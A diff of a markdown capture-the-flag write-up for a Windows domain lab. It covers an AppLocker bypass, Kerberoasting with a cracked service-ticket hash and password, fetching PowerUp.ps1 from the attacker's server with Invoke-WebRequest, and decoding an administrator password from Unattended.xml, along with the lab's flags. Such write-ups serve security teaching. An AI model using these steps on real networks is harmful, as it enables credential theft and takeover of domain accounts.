@@ -38,12 +38,9 @@ Deploy the windows machine, you will be able to control this in your browser. Ho
 
 ![](https://i.imgur.com/XtUZMLi.png)
 
-
 AppLocker is an application whitelisting technology introduced with Windows 7. It allows restricting which programs users can execute based on the programs path, publisher and hash.
 
 You will have noticed with the deployed machine, you are unable to execute your own binaries and certain functions on the system will be restricted.
-
-
 
 There are many ways to bypass AppLocker.
 
@@ -71,7 +68,6 @@ int main() {
         return 0;
 }
 
-
 ┌──(kali㉿kali)-[~/corp]
 └─$ x86_64-w64-mingw32-gcc hello.c -o hello.exe                            
                                                                                                                  
@@ -82,7 +78,6 @@ hello.c  hello.exe
 ┌──(kali㉿kali)-[~/corp]
 └─$ python3 -m http.server   
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-
 
 go to c:\windows\system32 then execute cmd cz cannot search cmd
 
@@ -115,7 +110,6 @@ c:\Windows\System32\spool\drivers\color>cd \users\dark\desktop
 c:\Users\dark\Desktop>hello.exe
 This program is blocked by group policy. For more information, contact your system administrator.
 
-
 c:\Users\dark\Desktop>more \Users\dark\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ls
 dir
@@ -130,13 +124,9 @@ dir
 hello.exe
 \.hello.exe
 
-
 ```
 
-
 Go ahead and use Powershell to download an executable of your choice locally, place it the whitelisted directory and execute it.
-
-
 
 	Just like Linux bash, Windows powershell saves all previous commands into a file called ConsoleHost_history. This is located at %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 
@@ -153,8 +143,6 @@ It is important you understand how Kerberous actually works in order to know how
 https://youtu.be/LmbP-XD1SC8
 
 Kerberos is the authentication system for Windows and Active Directory networks. There are many attacks against Kerberos, in this room we will use a Powershell script to request a service ticket for an account and acquire a ticket hash. We can then crack this hash to get access to another user account!
-
-
 
 Lets first enumerate Windows. If we run setspn -T medin -Q ​ */* we can extract all accounts in the SPN.
 
@@ -202,7 +190,6 @@ CN=fela,CN=Users,DC=corp,DC=local
 Existing SPN found!
 ```
 
-
 *fela*
 
 Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
@@ -218,8 +205,6 @@ You should get a SPN ticket.
 ![](https://i.imgur.com/X2lGkzF.png)
 
 Machines don't have internet access. You will need to download the Kerberoast.ps1 file manually, host a web server (sudo python -m SimpleHTTPServer 80) and use your local host to have the machine download it.
-
-
 
 Lets use hashcat to bruteforce this password. The type of hash we're cracking is Kerberos 5 TGS-REP etype 23 and the hashcat code for this is 13100.
 
@@ -259,7 +244,6 @@ PS C:\Windows\System32\spool\drivers\color> . .\Invoke-Kerberoast.ps1
 
 PS C:\Windows\System32\spool\drivers\color> Invoke-Kerberoast -OutputFormat hashcat |fl
 
-
 TicketByteHexStream  :
 Hash                 : $krb5tgs$23$*fela$corp.local$HTTP/fela*$30BA38D229EE3D103B1318563F83E9A1$CDD4CF4465CDAC959F32CFD
                        1AC71296A748D58CEF6EEEA0D4076FED0C2799055C5C0536F86C65D78C44A5538C0F9222A005A5A2E3ECC086010AABF5
@@ -287,14 +271,12 @@ SamAccountName       : fela
 DistinguishedName    : CN=fela,CN=Users,DC=corp,DC=local
 ServicePrincipalName : HTTP/fela
 
-
 ┌──(kali㉿kali)-[~/corp]
 └─$ nano hash.txt
                                                                                                                                  
 ┌──(kali㉿kali)-[~/corp]
 └─$ cat hash.txt 
 $krb5tgs$23$*fela$corp.local$HTTP/fela*$30BA38D229EE3D103B1318563F83E9A1$CDD4CF4465CDAC959F32CFD1AC71296A748D58CEF6EEEA0D4076FED0C2799055C5C0536F86C65D78C44A5538C0F9222A005A5A2E3ECC086010AABF5C9E880418E0BAB2AD0AE8A6FD5E17B685878D115E814C9615940286AF8CF1EC40E1560D6325FF4A46522CEB7E377FF765ADF165E6B802B035B124279011E71220572B95A88457450848EAAB4171B6A55C3EBA9409E7A14372DB25358EDB748911663D6AE7DCB06D7748ED16CBB386E4A61459BD1286478E744F7F5E67298CCD70384572AE958B0507E888D53577FAD812B13D01510C79E5160AAE49901D1B465624836C0F2A53E29ABF93095ECC6A1AA445F4383E0012FBEEBE6A9501DD328799F0D70EB09D6210095275690C392025C38FE56DBF52775E41ADCDD32BCF5AD7E61DC8EAD114B7680F39C0DF84C1941585B273E192343BB3DBE01C6D8226C985FC53AAD48443786E64B436FC8DE43E5546155B2170CA8F09245678879590EBFF2258DEDD52EE0F850E17181D3FC9C4828E43C3BB4EE4C4E08A17A9331E34FF25430E57CE6AC27004CC91D72FF3936CD02891E4E266C303F09C70EFC2D13074B9D43DB08FD992D592FABF618D64F583187241E7B0AB00558EBE267290DC8080AD216F67991DA138EFD92CB18B95A70969C9DE528503B897F4991F87F3AE0CCC28089F789CE990E712ACC5DCDDF37CC61A45CD95D7E532DA30CEBA454A5163EBF1CE267C5FF88150E3BEABC8CB92D76001E2FCA338648BD689884F9BAC6C536EAC2A0119B0930C0EF638F486C3610929AEDAEB47C9D463BBDE25938FCDF6396D7B04858977575C307525F7EDD170C4F2A7319EDEB11386344BECB56224A3A37ADC6BB1CF8E0B9088F36108D3FD31DCD80ECDE7DDA7B3F977731BFEA14F537C0F4B32E5A853164EE07ED279B8574CEB625AFB79A3C6F123FB2D57F85461EF2A034100387D5B081B164FF8B15DFD5AEDA0DE11A948D24CD4AEA0F48A83DFAD5E521D81C7494257584DC4270B746EBA09C500288BD0AADFC3545F08E783A7DBC7ED58453DAB7748E9EE3F201F10A87C01553F712289537257F6479471DE6C9D36CF9BC7FA4C444313C10450BDA22B2F8BAE866B705C34372D3AF01B32ACD4BF2D6162ADB6AFE876481B74C84C776D12CA1CBA8906F720F710A76CA0237B7E50F6C24E200343D1F08FC57D65A31CFC55723D535C384BA3D486BCACFDA5AFEAC8501DBF9982596F000D766CAAB6D9DAD73F5B27DD5BDB52B8A3CCD3537ABFA02A84DFD0BA380DFDA0B52A4DE4C5F4E9C76053924B7464B7ACF0F6CAF93C3CFFB467D1EDFF615F31EC9E109E7680F0AD9C421AF18521C18C9626AA6A44137B824911DFA92FA5759D88DFF49F43D23266EA8EC35F1D3AF1DBDEB15E37CD9CA6E86F3C7BD8BE294226210B
-
 
 ┌──(kali㉿kali)-[~/corp]
 └─$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt  
@@ -387,9 +369,7 @@ rubenF124        (?)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 
-
 ```
-
 
 ```
 
@@ -400,7 +380,6 @@ flag{bde1642535aa396d2439d86fe54a36e4}
 
 ```
 
-
 Login as this user. What is his flag?
 Look on their desktop.
 *flag{bde1642535aa396d2439d86fe54a36e4}*
@@ -408,8 +387,6 @@ Look on their desktop.
 ### Privilege Escalation 
 
 We will use a PowerShell enumeration script to examine the Windows machine. We can then determine the best way to get Administrator access.
-
-
 
 We will run PowerUp.ps1 for the enumeration.
 
@@ -424,7 +401,6 @@ The script has identified several ways to get Administrator access. The first be
 	It is also where users passwords are stored in base64. Navigate to C:\Windows\Panther\Unattend\Unattended.xml.
 
 ![](https://i.imgur.com/IMU9bcO.png)
-
 
 ```
 ┌──(kali㉿kali)-[~/corp]
@@ -445,14 +421,12 @@ PowerUp.ps1                      100%[==========================================
 └─$ ls
 hash.txt  hello.c  hello.exe  Invoke-Kerberoast.ps1  PowerUp.ps1
 
-
 again go to c:\windows\system32\cmd
 
 ┌──(kali㉿kali)-[~/corp]
 └─$ python3 -m http.server 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.10.62.161 - - [28/Sep/2022 17:12:20] "GET /PowerUp.ps1 HTTP/1.1" 200 -
-
 
 PS C:\Windows\System32> cd C:\Users\fela.CORP
 PS C:\Users\fela.CORP> Invoke-WebRequest -Uri 'http://10.11.81.220:8000/PowerUp.ps1' -OutFile 'PowerUp.ps1'
@@ -462,58 +436,37 @@ PS C:\Users\fela.CORP> Invoke-AllChecks
 
 [*] Running Invoke-AllChecks
 
-
 [*] Checking if user is in a local group with administrative privileges...
 [+] User is in a local group that grants administrative privileges!
 [+] Run a BypassUAC attack to elevate privileges to admin.
 
-
 [*] Checking for unquoted service paths...
-
 
 [*] Checking service executable and argument permissions...
 
-
 [*] Checking service permissions...
 
-
 [*] Checking %PATH% for potentially hijackable .dll locations...
-
 
 HijackablePath : C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\
 AbuseFunction  : Write-HijackDll -OutputFile 'C:\Users\fela.CORP\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'
                  -Command '...'
 
-
-
-
-
 [*] Checking for AlwaysInstallElevated registry key...
-
 
 [*] Checking for Autologon credentials in registry...
 
-
 [*] Checking for vulnerable registry autoruns and configs...
-
 
 [*] Checking for vulnerable schtask files/configs...
 
-
 [*] Checking for unattended install files...
-
 
 UnattendPath : C:\Windows\Panther\Unattend\Unattended.xml
 
-
-
-
-
 [*] Checking for encrypted web.config strings...
 
-
 [*] Checking for encrypted application pool and virtual directory passwords...
-
 
 PS C:\Users\fela.CORP> more C:\Windows\Panther\Unattend\Unattended.xml
 <AutoLogon>
@@ -525,7 +478,6 @@ PS C:\Users\fela.CORP> more C:\Windows\Panther\Unattend\Unattended.xml
     <Username>Administrator</Username>
 </AutoLogon>
 
-
 dHFqSnBFWDlRdjh5YktJM3lIY2M9TCE1ZSghd1c7JFQ=
 
 base64
@@ -534,19 +486,12 @@ tqjJpEX9Qv8ybKI3yHcc=L!5e(!wW;$T
 
 When you will connect as administrator, you will be prompted to change the password. Make sure you set up a strong password, else you’ll have to type the password again :). 
 
-
 ```
-
-
-![[Pasted image 20220928162056.png]]
 
 What is the decoded password?
 **
 
-
 Now we have the Administrator's password, login as them and obtain the last flag.
 *THM{g00d_j0b_SYS4DM1n_M4s73R}*
-
-
 
 [[Retro]]
